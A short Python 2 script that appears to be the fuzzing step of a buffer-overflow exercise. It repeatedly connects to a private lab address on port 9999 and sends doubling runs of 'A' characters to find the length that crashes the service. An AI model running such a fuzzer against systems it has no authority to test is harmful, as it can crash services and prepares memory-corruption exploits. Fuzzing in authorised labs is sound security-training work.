#!/usr/bin/python2
import socket

buff="A"*200

while len(buff) <= 2000: 
  print "Fuzzing with {}".format(len(buff))
  s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  connect = s.connect(("192.168.66.112",9999))
  print "Connected"
  s.recv(1024)
  s.send(buff + "\r\n")
  print "sended"
  s.close()
  print "closed"
  buff+="A"*len(buff)
